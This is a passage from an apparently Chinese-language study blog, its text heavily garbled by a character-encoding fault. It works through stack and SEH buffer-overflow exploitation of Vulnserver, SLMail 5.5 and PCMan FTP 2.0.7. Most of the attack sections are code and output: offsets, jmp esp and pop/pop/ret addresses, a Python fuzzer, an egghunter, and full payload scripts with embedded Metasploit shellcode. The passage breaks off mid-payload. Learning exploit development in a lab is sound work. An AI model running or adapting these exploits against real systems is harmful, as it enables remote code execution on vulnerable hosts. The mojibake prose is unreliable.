ä¸ºä»€ä¹ˆè¦æŸ¥æ‰¾åå­—ç¬¦? 
è¿™æ˜¯å› ä¸ºæ¯ä¸ªç¨‹åºçš„è¾“å…¥ç‚¹åˆ¤æ–­ä¸ä¸€æ ·ï¼Œæ¯”å¦‚æœ‰çš„è¾“å…¥ç‚¹åªå…è®¸è¾“å…¥æ•°å­—ï¼Œæœ‰çš„ç¨‹åºä¸å…è®¸è¾“å…¥å­—ç¬¦ã€‚éœ€è¦æ‰¾åˆ°è¿™äº›ç¨‹åºä¸æ­£å¸¸å¤„ç†çš„åå­—ç¬¦ï¼Œç”¨è¿™äº›åå­—ç¬¦ä¹‹å¤–çš„å­—ç¬¦æ¥ç”Ÿæˆshellcodeï¼Œè¿™æ ·å¯ä»¥é¿å…ç¨‹åºå› ä¸ºå¼‚å¸¸è€Œç»ˆæ­¢ã€‚</li>
</ul>
<p>åœ¨EIPä¹‹åå‘é€æ‰€æœ‰å­—ç¬¦æ¥æµ‹è¯•åå­—ç¬¦
åœ¨0x09åçš„0x0aå˜æˆäº†0x00ï¼Œ0x0aæ˜¯ä¸€ä¸ªåå­—ç¬¦ã€‚
<img alt="" src="../../images/Snipaste_2023-10-11_13-10-53.jpg" />
å»æ‰0x0aåé‡æ–°å‘é€ï¼Œå¾ªç¯æ­¤æ­¥éª¤ä»¥æ‰¾åˆ°æ‰€æœ‰çš„åå­—ç¬¦</p>
<ul>
<li>é‡å®šå‘æ‰§è¡Œæµ
è¿™æ˜¯shellcodeè¢«æ‰§è¡Œçš„å…³é”®ä¸€æ­¥ã€‚
æ‰¾åˆ°ç¨‹åºä¸­å­˜åœ¨çš„<code>jmp esp</code>æˆ–è€…<code>call esp</code>å¯ä»¥è®©ç¨‹åºè·³åˆ°espçš„ä½ç½®é‡æ–°æ‰§è¡Œï¼Œä»¥ä¾¿è®©shellcodeè¢«æ‰§è¡Œ
é€šè¿‡åŒ¹é…ç‰¹å¾æ‰¾åˆ°äº†4ä¸ª<code>jmp esp</code></li>
</ul>
<p><img alt="" src="../../images/Snipaste_2023-10-11_14-09-35.jpg" /></p>
<p>åœ°å€åˆ†åˆ«æ˜¯</p>
<pre><code>f7552677
85102177
c3c12177
f2131f77
</code></pre>
<p>å°†<code>EIP</code>çš„å€¼æ›¿æ¢ä¸º<code>f7552677</code>ä¾¿å¯ä»¥è®©ç¨‹åºé‡æ–°æ‰§è¡ŒESPåœ°å€çš„ä»£ç </p>
<p>æ¥ç€éœ€è¦åœ¨<code>jmp esp</code>åé¢æ’å…¥<code>nop</code>ï¼Œç¡®ä¿jmpä¹‹åä¼šæ‰§è¡Œåˆ°shellcode</p>
<ul>
<li>ç”Ÿæˆshellcode
è¦æ³¨æ„çš„
<em>shellcodeä¸èƒ½æœ‰åå­—ç¬¦
shellcodeé€€å‡ºçº¿ç¨‹,ä¸èƒ½é€€å‡ºè¿›ç¨‹</em>
ä½¿ç”¨msfç”Ÿæˆshellcode</li>
</ul>
<pre><code>generate EXITFUNC=thread -b &quot;\x00\x0a&quot;
</code></pre>
<p><img alt="" src="../../images/Snipaste_2023-10-11_14-30-06.jpg" /></p>
<p>æ­¤æ—¶å®Œæ•´payloadæ˜¯
<code>146å­—èŠ‚éšæœºå­—ç¬¦ + 0xf7552677 + 8å­—èŠ‚nop + shellcode</code></p>
<p><img alt="" src="../../images/Snipaste_2023-10-11_14-39-08.jpg" /></p>
<h5 id="b">ç»ƒä¹ B</h5>
<p>ç¨‹åºè¿è¡Œåçš„æ ·å­</p>
<pre><code>C:\&gt;nc 192.168.14.139 9999
Welcome to Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
</code></pre>
<p>æŸä¸ªå‘½ä»¤çš„æŸäº›å­—ç¬¦ä¸²ä¼šå¯¼è‡´ç¼“å­˜æº¢å‡º</p>
<p>TRUN å‘½ä»¤åè·Ÿ<code>/.</code>ï¼Œä¹‹åçš„å­—ç¬¦ä¸²åˆ°ä¸€å®šæ•°é‡åä¼šè§¦å‘æº¢å‡º
<img alt="" src="../../images/Snipaste_2023-10-12_11-12-11.jpg" /></p>
<p>GMONä¹Ÿå­˜åœ¨ç›¸åŒé—®é¢˜,æº¢å‡ºåˆ°EBP,æº¢å‡ºä¸åˆ°EIP
<img alt="" src="../../images/Snipaste_2023-10-12_11-27-32.jpg" /></p>
<p>KSTETä¹Ÿå­˜åœ¨æº¢å‡º,å¯è¦†ç›–EIP,è¦†ç›–ä¸äº†æ ˆ</p>
<p><img alt="" src="../../images/Snipaste_2023-10-12_12-48-22.jpg" /></p>
<p>GTERä¹Ÿå­˜åœ¨æº¢å‡º,å¯æº¢å‡ºåˆ°EIP.ä½†æµ‹è¯•ä¹‹åå‘ç°æº¢å‡ºåçš„å¯æ§ç©ºé—´ä¸è¶³
<img alt="" src="../../images/Snipaste_2023-10-12_12-50-13.jpg" /></p>
<p>è¿˜æ˜¯ç”¨TRUNæµ‹è¯•
æµ‹è¯•EIPåç§»é‡</p>
<p>æµ‹è¯•åå­—ç¬¦,æ²¡æœ‰å‘ç°0x00å¤–çš„åå­—ç¬¦</p>
<p><img alt="" src="../../images/Snipaste_2023-10-12_13-49-25.jpg" /></p>
<p>æœ€ç»ˆçš„payloadæ˜¯</p>
<pre><code>eip = &quot;\xaf\x11\x50\x62&quot;
nop = &quot;\x90&quot; * 20

all = b&quot;TRUN /./Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Caaabb&quot; + eip + nop + buf

</code></pre>
<p><img alt="" src="../../images/Snipaste_2023-10-12_14-48-08.jpg" /></p>
<h5 id="c">ç»ƒä¹ C</h5>
<p>ç¨‹åº: slmail 5.5ç‰ˆæœ¬ç¼“å†²åŒºæº¢å‡º
POP3åè®®è¿æ¥ï¼ŒPASSå‘½ä»¤åè¾“å…¥ç‚¹å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´</p>
<p><img alt="" src="../../images/Snipaste_2023-10-12_15-48-48.jpg" /></p>
<p>æ ¹æ®ä½œè€…payloadå¯å¾—çŸ¥,åœ¨PASSå‘½ä»¤åæ’å…¥2606ä¸ªåå­—ç¬¦å­—ç¬¦å¯å¯¼è‡´æº¢å‡º,EIPåç§»é‡å°±åœ¨2606,ä¹‹åçš„æ•°æ®ä¼šæº¢å‡ºåˆ°ESP.</p>
<p>å¦‚å›¾EIPçš„å€¼è¢«è¦†ç›–ä¸ºAAAA
<img alt="" src="../../images/Snipaste_2023-10-12_15-52-55.jpg" /></p>
<p>æ‰¾åˆ°<code>jmp esp</code>åœ°å€å¹¶å°†EIPçš„å€¼æº¢å‡ºä¸ºè¯¥å€¼ï¼Œç¨‹åºæ­£ç¡®è·³åˆ°äº†è¿™ä¸ªåœ°æ–¹
<img alt="" src="../../images/Snipaste_2023-10-12_16-17-12.jpg" /></p>
<p>æ¥ç€æµ‹è¯•åå­—ç¬¦
ç»æµ‹è¯•,åå­—ç¬¦ä¸º<code>\x00\x0a\x0b\x0d</code>ï¼Œæ’é™¤åå­—ç¬¦ç”Ÿæˆshellcodeï¼Œå‘é€</p>
<p><img alt="" src="../../images/Snipaste_2023-10-12_17-22-49.jpg" /></p>
<h5 id="d">ç»ƒä¹ D</h5>
<p>è½¯ä»¶ï¼šPCMAN 2.0.7ç‰ˆæœ¬ 21ç«¯å£å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´</p>
<p>æ¥ç€æµ‹è¯•</p>
<p>å¾€21ç«¯å£å‘é€æ•°æ®å¯ä»¥çœ‹åˆ°è¢«æœåŠ¡å™¨æ¥æ”¶ä¸”å›æ˜¾åœ¨æ—¥å¿—æ </p>
<p><img alt="" src="../../images/Snipaste_2023-10-13_12-48-55.jpg" /></p>
<p>boofuzzè·‘ä¸€ä¸‹ï¼Œç¨‹åºåœ¨æ­¤å¤„crashäº†</p>
<p><img alt="" src="../../images/Snipaste_2023-10-13_12-53-51.jpg" /></p>
<p>boofuzzè„šæœ¬å‘äº†10000å­—èŠ‚æ•°æ®äº§ç”Ÿäº†crashï¼Œä½¿ç”¨è‡ªå®šä¹‰æ•°æ®æµ‹è¯•ä¸€ä¸‹æº¢å‡ºç‚¹</p>
<p>è¿™æ¬¡å‘é€äº†5000å­—èŠ‚ä¹Ÿcrash
<img alt="" src="../../images/Snipaste_2023-10-13_12-59-15.jpg" /></p>
<pre><code>â””â”€# msf-pattern_offset -q 43396F43                                                      
[*] Exact match at offset 2007

</code></pre>
<p>EIPåç§»é‡2007</p>
<p>åå­—ç¬¦<code>\x00\x0a\x0d</code></p>
<p>å®Œæ•´payload</p>
<pre><code>eip = &quot;\x01\x90\xd9\x73&quot;
nop = &quot;\x90&quot; * 16

buf =  b&quot;&quot;
buf += b&quot;\xdb\xd7\xd9\x74\x24\xf4\xb8\x88\x11\x6c\xc8\x5a\x2b&quot;
buf += b&quot;\xc9\xb1\x32\x31\x42\x17\x03\x42\x17\x83\x4a\x15\x8e&quot;
buf += b&quot;\x3d\xb6\xfe\xcc\xbe\x46\xff\xb0\x37\xa3\xce\xf0\x2c&quot;
buf += b&quot;\xa0\x61\xc1\x27\xe4\x8d\xaa\x6a\x1c\x05\xde\xa2\x13&quot;
buf += b&quot;\xae\x55\x95\x1a\x2f\xc5\xe5\x3d\xb3\x14\x3a\x9d\x8a&quot;
buf += b&quot;\xd6\x4f\xdc\xcb\x0b\xbd\x8c\x84\x40\x10\x20\xa0\x1d&quot;
buf += b&quot;\xa9\xcb\xfa\xb0\xa9\x28\x4a\xb2\x98\xff\xc0\xed\x3a&quot;
buf += b&quot;\xfe\x05\x86\x72\x18\x49\xa3\xcd\x93\xb9\x5f\xcc\x75&quot;
buf += b&quot;\xf0\xa0\x63\xb8\x3c\x53\x7d\xfd\xfb\x8c\x08\xf7\xff&quot;
buf += b&quot;\x31\x0b\xcc\x82\xed\x9e\xd6\x25\x65\x38\x32\xd7\xaa&quot;
buf += b&quot;\xdf\xb1\xdb\x07\xab\x9d\xff\x96\x78\x96\x04\x12\x7f&quot;
buf += b&quot;\x78\x8d\x60\xa4\x5c\xd5\x33\xc5\xc5\xb3\x92\xfa\x15&quot;
buf += b&quot;\x1c\x4a\x5f\x5e\xb1\x9f\xd2\x3d\xdc\x5e\x60\x38\x92&quot;
buf += b&quot;\x61\x7a\x42\x83\x09\x4b\xc9\x4c\x4d\x54\x18\x29\xb1&quot;
buf += b&quot;\xb6\x88\x44\x5a\x6f\x59\xe5\x07\x90\xb4\x2a\x3e\x13&quot;
buf += b&quot;\x3c\xd3\xc5\x0b\x35\xd6\x82\x8b\xa6\xaa\x9b\x79\xc8&quot;
buf += b&quot;\x19\x9b\xab\xa6\xf2\x17\x31\x46\x6c\xbc\x97\xc3\x16&quot;
buf += b&quot;\x59\xe8&quot;

all = &quot;\x90&quot; * 2007
all += eip
all += nop
all += buf

</code></pre>
<p><img alt="" src="../../images/Snipaste_2023-10-13_14-32-15.jpg" /></p>
<h5 id="eseh">ç»ƒä¹ E(SEH)</h5>
<p>é‡åšvulserver.exe
https://zflemingg1.gitbook.io/undergrad-tutorials/walkthroughs-osce/vulnserver-gmon-command</p>
<p>GMONå‘½ä»¤å¯æº¢å‡ºï¼Œæ— æ³•ä¿®æ”¹EIPï¼Œä½†æ˜¯å¯ä»¥æº¢å‡ºåˆ°SEH
<img alt="" src="../../images/Snipaste_2023-10-13_17-08-55.jpg" /></p>
<p>SEHä¸¤æ¡åç§»é‡</p>
<pre><code>â””â”€# msf-pattern_offset -q 6F45346F
[*] Exact match at offset 3553

â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# msf-pattern_offset -q 45336f45
[*] Exact match at offset 3549
</code></pre>
<p>å¯ä»¥æ§åˆ¶SEHäº†
<img alt="" src="../../images/Snipaste_2023-10-13_17-19-47.jpg" /></p>
<p>ä¸æ™®é€šæ‰¾åˆ°<code>jmp esp</code>çš„æ–¹å¼ä¸åŒçš„æ˜¯ï¼ŒSEHæº¢å‡ºåˆ©ç”¨éœ€è¦æ‰¾åˆ°ä¸€å¤„pop/pop/retæŒ‡ä»¤ç»„ã€‚è¿™æ˜¯å› ä¸ºSEHåœ¨è¢«è°ƒç”¨æ—¶ä¼šåœ¨æ ˆä¸Šå‹å…¥æ•°ä¸ªå‚æ•°ï¼Œä¸¤æ¬¡popæŒ‡ä»¤å¯ä»¥è®©ESPâ€”â€”æ ˆé¡¶çš„ä½ç½®å¾€é«˜ä½å¤„ç§»åŠ¨8å­—èŠ‚(32ä½ç¨‹åºä¸­ä¸¤æ¬¡popå¯„å­˜å™¨ï¼Œå¯„å­˜å™¨å¤§å°æ˜¯4å­—èŠ‚)ã€‚å½“ESPå‡å°8å­—èŠ‚åå†ä½¿ç”¨RETæ­£å¥½å¯ä»¥æ‰§è¡ŒESPä¸­è¢«æ§åˆ¶çš„SEHæˆå‘˜åœ°å€ã€‚</p>
<p>åœ°å€ä¸º <code>625010b4</code>
<img alt="" src="../../images/Snipaste_2023-10-13_17-38-13.jpg" /></p>
<p>å°†SEHçš„åœ°å€è¦†ç›–ä¸º<code>625010b4</code>ï¼Œç¨‹åºæˆåŠŸæ‰§è¡Œåˆ°äº†è¯¥å¤„
ä¸ºæ­¤éœ€è¦å‘é€çš„payloadæ ¼å¼ä¸º
<code>SEHæº¢å‡ºåç§»é‡ + NSEH + SEH + å¡«å……ç¬¦</code>
NSEHæ˜¯åœ¨SEHæ‰§è¡Œåè°ƒç”¨çš„æŒ‡ä»¤ã€‚
ç¨‹åºäº§ç”Ÿå¼‚å¸¸åä¼šå…ˆè°ƒç”¨SEHåœ°å€çš„æŒ‡ä»¤ï¼Œæ­¤æ—¶SEHåœ°å€è¢«è¦†ç›–ä¸ºäº†2ä¸ªpop 1ä¸ªretï¼Œè¿™ä¼šå¯¼è‡´ç›´æ¥æ‰§è¡ŒNSEHåœ°å€çš„æŒ‡ä»¤ï¼ŒNSEHçš„æŒ‡ä»¤æŒ‡å¼•è‡ªå®šä¹‰çŸ­è·³æŒ‡ä»¤è·³å…¥shellcodeåŒºã€‚</p>
<p><img alt="" src="../../images/Snipaste_2023-10-13_17-45-41.jpg" /></p>
<p>2æ¬¡popåretè¿”å›åˆ°äº†SEHçš„å°ç¼“å†²åŒº
<img alt="" src="../../images/Snipaste_2023-10-13_17-47-49.jpg" /></p>
<p>è™½ç„¶å¯ä»¥ä½¿ç”¨çŸ­è·³è·³å…¥ä¸‹é¢çš„å¯æ§åŒºåŸŸï¼Œä½†æ˜¯ä¸‹é¢çš„åŒºåŸŸæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´è®©å…¥shellcodeã€‚</p>
<p>ç”±äºä¸èƒ½å¾€åè·³ï¼Œé‚£å°±å¾€å›è·³ï¼Œå‰é¢çš„ç©ºé—´ä¹Ÿæ˜¯å¯æ§çš„
<img alt="" src="../../images/Snipaste_2023-10-14_11-00-02.jpg" /></p>
<p>ä½†æ˜¯çŸ­è·³çš„è·ç¦»æ˜¯æœ‰é™çš„ï¼Œæ— æ³•è·³è·ƒæ•´ä¸ªshellcodeã€‚æ­¤æ—¶å¯ä»¥é‡‡ç”¨å…ˆçŸ­è·³è‡³egghunteræŒ‡ä»¤ï¼Œegghunteråœ¨å‰é¢çš„æ›´å¤§çš„ç¼“å†²åŒºä¸­æŸ¥æ‰¾eggæ ‡è®°ï¼Œåœ¨eggæ ‡è®°åæ”¾ç½®shellcodeæ¥æ‰§è¡Œshellcode</p>
<p>æ•´ä¸ªpayloadå¦‚ä¸‹</p>
<pre><code>
//egghunterä»£ç 
egghunter=b&quot;&quot;
egghunter+=b&quot;\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53&quot;
egghunter+=b&quot;\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c&quot;
egghunter+=b&quot;\x05\x74\xdf\xb8\x50\x57\x4e\x44\x8b\xfa\xaf\x75\xda\xaf\x75\xd7&quot;
egghunter+=b&quot;\xff\xe7&quot;

//æ‰§è¡Œnotepadçš„shellcode
buf =  b&quot;&quot;
buf += b&quot;\xda\xc0\xd9\x74\x24\xf4\xbb\x74\x96\x27\xf3\x5d\x2b&quot;
buf += b&quot;\xc9\xb1\x32\x31\x5d\x17\x83\xc5\x04\x03\x29\x85\xc5&quot;
buf += b&quot;\x06\x2d\x41\x8b\xe9\xcd\x92\xec\x60\x28\xa3\x2c\x16&quot;
buf += b&quot;\x39\x94\x9c\x5c\x6f\x19\x56\x30\x9b\xaa\x1a\x9d\xac&quot;
buf += b&quot;\x1b\x90\xfb\x83\x9c\x89\x38\x82\x1e\xd0\x6c\x64\x1e&quot;
buf += b&quot;\x1b\x61\x65\x67\x46\x88\x37\x30\x0c\x3f\xa7\x35\x58&quot;
buf += b&quot;\xfc\x4c\x05\x4c\x84\xb1\xde\x6f\xa5\x64\x54\x36\x65&quot;
buf += b&quot;\x87\xb9\x42\x2c\x9f\xde\x6f\xe6\x14\x14\x1b\xf9\xfc&quot;
buf += b&quot;\x64\xe4\x56\xc1\x48\x17\xa6\x06\x6e\xc8\xdd\x7e\x8c&quot;
buf += b&quot;\x75\xe6\x45\xee\xa1\x63\x5d\x48\x21\xd3\xb9\x68\xe6&quot;
buf += b&quot;\x82\x4a\x66\x43\xc0\x14\x6b\x52\x05\x2f\x97\xdf\xa8&quot;
buf += b&quot;\xff\x11\x9b\x8e\xdb\x7a\x7f\xae\x7a\x27\x2e\xcf\x9c&quot;
buf += b&quot;\x88\x8f\x75\xd7\x25\xdb\x07\xba\x23\x1a\x95\xc1\x06&quot;
buf += b&quot;\x1c\xa5\xc9\x36\x75\x94\x42\xd9\x02\x29\x81\x9d\xed&quot;
buf += b&quot;\xcb\x03\xe8\x85\x55\xc6\x51\xc8\x65\x3d\x95\xf5\xe5&quot;
buf += b&quot;\xb7\x66\x02\xf5\xb2\x63\x4e\xb1\x2f\x1e\xdf\x54\x4f&quot;
buf += b&quot;\x8d\xe0\x7c\x21\x5e\x6b\x1a\xcd\xc1\xf7\xca\x48\x7a&quot;
buf += b&quot;\x9d\x12&quot;

all = b&quot;GMON /.&quot;                 //é€ æˆæº¢å‡ºçš„å­—ç¬¦
all += &quot;A&quot; * 8                   //å ä½ï¼Œä¸æœ‰æ•ˆæ•°æ®åˆ†å¼€
all += b&quot;PWNDPWND&quot; + buf         //eggæ ‡å¿—åé¢è·Ÿshellcode
all += &quot;\x90&quot; * (3556 - 50 -len(all))    //å‡å»eggæ ‡å¿—ã€shellcodeã€egghunterä»£ç åçš„å¡«å……
all += egghunter                //egghunterå¡«å……å­—ç¬¦ï¼Œæ”¾åœ¨è¿™é‡Œä¾¿äºè¢«çŸ­è·³åˆ°
all += &quot;\x90&quot; * (3556 - len(all))    //å‰©ä½™çš„å¡«å……å­—ç¬¦
all += &quot;\xeb\xbc\x90\x90&quot;      //nsehï¼Œè¿™æ˜¯ä¸€ä¸ªçŸ­è·³æŒ‡ä»¤
all += &quot;\xb4\x10\x50\x62&quot;      //æŒ‡å‘pop pop retæŒ‡ä»¤çš„åœ°å€ï¼Œä¾¿äºæ‰§è¡Œnsehä¸­åœ°å€
all += &quot;\x90&quot; * 1000            //å¡«å……ç¬¦

s.send(all)
</code></pre>
<p><img alt="" src="../../images/Snipaste_2023-10-14_13-53-37.jpg" /></p>
<h5 id="f">ç»ƒä¹ F</h5>
<p>vulserverçš„HTERå‘½ä»¤ç»ƒä¹ </p>
<p>æ ˆæº¢å‡ºEIPè¦†ç›–ï¼Œç›´æ¥ä½¿ç”¨æ™®é€šå­—ç¬¦å¯ä»¥é€ æˆæº¢å‡ºã€‚ä½†æ˜¯æº¢å‡ºå­—ç¬¦è¢«ç›´æ¥å†™å…¥äº†å†…å­˜ã€‚
<img alt="" src="../../images/Snipaste_2023-10-16_14-17-01.jpg" /></p>
<p>msfç”Ÿæˆçš„å­—ç¬¦åœ¨è¿™ç§ç¯å¢ƒæ— æ³•ä½¿ç”¨ï¼Œæ‰€ä»¥å­—ç¬¦éƒ½ä»¥16è¿›åˆ¶å†™å…¥å†…å­˜ï¼Œæµ‹è¯•æ²¡åŠæ³•é€ æˆæº¢å‡ºã€‚
ä½¿ç”¨è„šæœ¬ä¸€ä¸ªä¸ªå‘é€å­—ç¬¦ï¼Œåå¤æµ‹è¯•ï¼Œæœ€ç»ˆæº¢å‡ºç‚¹åœ¨<code>HTER</code>çš„2041å­—ç¬¦å</p>
<pre><code>import socket
import sys
ip = &quot;192.168.14.139&quot;
port = 9999
string = &quot;HTER &quot;
s = socket.socket()
s.connect((ip, port))
timeout = 3 
s.settimeout(timeout)
while True:
        try:
                        print(&quot;Fuzzing with {} bytes&quot;.format(len(string)))
                        s.send(string + b&quot;\x0a\x0d&quot;)
                        string += b&quot;A&quot; * 1
                        s.recv(1024)
        except:
                print(&quot;Fuzzer crashed at {} bytes&quot;.format(len(string)))
                sys.exit(0)
s.close()
</code></pre>
<p><img alt="" src="../../images/Snipaste_2023-10-16_15-06-22.jpg" />
ç”¨monaæ’ä»¶æ‰¾åˆ°<code>jmp esp</code>çš„åœ°å€ã€‚</p>
<pre><code>[+] Command used:
!mona jmp -r esp

---------- Mona command started on 2023-10-16 15:15:42 (v2.0, rev 577) ----------
[+] Processing arguments and criteria
    - Pointer access level : X
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] Querying 2 modules
    - Querying module essfunc.dll
    - Querying module vulnserver.exe
    - Search complete, processing results
[+] Preparing output file 'jmp.txt'
    - (Re)setting logfile jmp.txt
[+] Writing results to jmp.txt
    - Number of pointers of type 'jmp esp' : 9 
[+] Results : 
0x625011af |   0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
0x625011bb |   0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
0x625011c7 |   0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
0x625011d3 |   0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
0x625011df |   0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
0x625011eb |   0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
0x625011f7 |   0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
0x62501203 |   0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
0x62501205 |   0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
</code></pre>
<p>åé¢å°±æ˜¯å¸¸è§„çš„æ‰¾åå­—ç¬¦ã€ç”Ÿæˆshellcodeï¼Œç„¶åå‘é€payloadã€‚å®Œæ•´payload</p>
<pre><code>all = &quot;HTER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA